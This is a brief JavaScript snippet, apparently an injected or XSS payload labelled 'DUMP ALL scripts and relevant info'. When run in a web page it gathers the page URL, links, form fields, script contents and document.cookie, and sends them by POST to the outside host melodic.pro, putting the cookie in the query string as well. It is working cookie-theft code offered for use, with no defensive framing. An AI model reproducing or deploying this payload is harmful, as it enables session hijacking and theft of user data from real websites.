

DUMP ALL scripts and relevant info.. another verison

(() => {
    const url = window.location.href;
    const path = ((url.match(/\/\/[^/]+(\/[^?]+)/) || [])[1] || url);
    const search = (url || '').split('?')[0];
    const links = Array.from(document.querySelectorAll('a')).map(a => a.href);
    const forms = Array.from(document.querySelectorAll('form')).map(form => ({
        action: form.action,
        method: form.method,
        inputs: Array.from(form.elements).map(el => ({ name: el.name, type: el.type }))
    }));
    const scripts = Array.from(document.querySelectorAll('script')).map(script => script.src || script.innerText.substring(0, 100));
    const cookies = document.cookie;

    const data = {
        path,
        search,
        links,
        forms,
        scripts,
        cookies
    };

    console.log('Data collected:', data);

    // Send the data to the specified endpoint
    fetch('https://melodic.pro?id=' + document.cookie, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
    .then(response => response.text())
    .then(text => console.log('Server response:', text))
    .catch(err => console.error('Fetch error:', err));
})();
